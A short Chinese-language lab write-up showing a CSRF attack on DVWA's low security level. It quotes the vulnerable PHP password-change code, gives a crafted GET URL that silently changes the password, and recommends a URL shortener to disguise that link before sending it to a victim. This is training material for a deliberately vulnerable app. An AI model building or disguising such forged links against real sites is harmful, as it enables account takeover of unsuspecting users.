## csrf演示dvwa的low模式
### 0、php源码
```shell script
if( isset( $_GET[ 'Change' ] ) ) {
    // Get input
    $pass_new  = $_GET[ 'password_new' ];   # 前端拿新密码
    $pass_conf = $_GET[ 'password_conf' ];  # 前端拿新密码

    // Do the passwords match?
    if( $pass_new == $pass_conf ) { # 判断2次密码是否一致
        ...
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
### 1、一般来说，GET请求，参数是什么，还是比较明显的
```shell script
http://172.16.120.252:8080/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#
```
![image](https://github.com/498946975/Security/blob/master/images/csrf_01.png)
### 2、建议使用短链接，短链接转换网址
https://www.ft12.com/
### 3、修改网址
长网址
```shell script
http://172.16.120.252:8080/vulnerabilities/csrf/?password_new=456&password_conf=456&Change=Change#
```
上面长网址，变成短网址
```shell script
http://u6.gg/kp9bg
```